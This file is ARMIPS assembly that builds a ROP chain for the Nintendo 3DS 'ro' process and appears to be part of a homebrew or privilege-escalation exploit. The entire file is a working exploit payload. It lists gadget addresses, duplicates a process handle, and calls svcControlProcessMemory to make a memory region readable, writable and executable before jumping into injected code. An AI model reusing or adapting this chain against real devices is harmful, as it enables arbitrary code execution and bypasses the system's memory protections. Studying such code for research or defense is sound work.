.nds

.include "../../build/constants.s"

.create "ro_initial_rop.bin",0x0

	.word 0x14005428 ; pop {r4, r5, r6, r7, pc}
		; initial return; loads up garbage into registers and moves on
		; (this is used by makeROP.py)
	.word 0x14001254 ; pop	{r4, lr} | b 0x140012B4 | mov r0, #0x3000000 | fmxr fpcsr, r0 | bx lr
		.word 0xDEADC0DE ; r4 (garbage)
		.word 0x14005b2c ; lr = pop {pc}
	; equivalent to .word 0x14005b2c ; pop {pc}

	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)
	.word 0x14005b2c ; pop {pc} (NOP)

;protect spider process handle value
;the formula is correct despite that pop {r1, pc} because the first word of the file doesn't really count
.orga RO_SPIDERHANDLE_LOCATION-(RO_ROP_START+RO_ROP_OFFSET)
	.word 0x14003a50 ; pop {r1, pc}
		.word 0xDEADBABE ; 0xDEADBABE is filtered out by makeROP.py (DO NOT CHANGE)

	;duplicate ro process handle
	.word 0x14003a50 ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (handle)
	.word 0x14002440 ; svcDuplicateHandle (ends in BX LR)
		.word RO_PROCESSHANDLEADR ; output handle address

	;load 0 into r2 (addr1)
	;we need r0==r1 for nn__fnd__HeapBase__FillMemory32
	.word 0x14003a50 ; pop {r1, pc}
		.word RO_GARBAGEADR ; r1
	.word 0x14003c34 ; pop {r4, pc}
		.word RO_GARBAGEADR ; r4 (=> r0)
	.word 0x140006C4 ; mov r0, r4 | pop {r4, pc}
		.word 0xDEADBABE ; r4 (garbage)
	.word 0x140006BC ; mov r2, #0 | bl nn__fnd__HeapBase__FillMemory32 | mov r0, r4 | pop {r4, pc}
		.word 0xDEADC0DE ; r4 (garbage)

	;reset lr
	.word 0x14001254 ; pop	{r4, lr} | b 0x140012B4 | mov r0, #0x3000000 | fmxr fpcsr, r0 | bx lr
		.word RO_PROCESSHANDLEADR-4 ; r4 (later, r0 = [r4, #4])
		.word 0x14005b2c ; lr = pop {pc}

	;load the other parameters and call svcControlProcessMemory
	.word 0x14000e70 ; ldr r0, [r4, #4] | pop {r4, r5, r6, pc}
		.word 0xDEADC0DE ; r4 (garbage)
		.word 0xDEADC0DE ; r5 (garbage)
		.word 0xDEADC0DE ; r6 (garbage)
	.word 0x140007cc ; pop {r3, r4, r5, pc}
		.word 0x00005000 ; r3 (size)
		.word 0x00000006 ; r4 (type) (PROTECT)
		.word 0x00000007 ; r5 (permissions) (RWX)
	.word 0x14003a50 ; pop {r1, pc}
		.word 0x007E5000 ; r1 (addr0)

	.word 0x14004328 ; svcControlProcessMemory | LDMFD SP!, {R4,R5} | BX LR (pop {pc})
		.word 0xDEADC0DE ; r4 (garbage)
		.word 0xDEADC0DE ; r5 (garbage)
	.word 0x007E5700 ; jump to code

.close
